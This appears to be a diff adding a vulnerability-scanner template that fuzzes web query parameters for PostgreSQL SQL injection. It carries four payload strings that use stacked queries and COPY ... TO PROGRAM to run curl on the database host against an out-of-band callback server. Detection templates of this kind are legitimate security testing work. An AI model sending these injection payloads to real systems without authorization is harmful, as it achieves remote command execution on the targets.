@@ -1,0 +1,31 @@
+id: fuzz-postgresql-oob
+
+info:
+  name: PostgreSQL OOB via COPY TO PROGRAM
+  author: openai
+  severity: critical
+  tags: postgres,oob,rce,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      pgsql_oob:
+        - "1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--"
+        - "1'; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--"
+        - "1"; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--"
+        - "1 COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--"
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "{{pgsql_oob}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
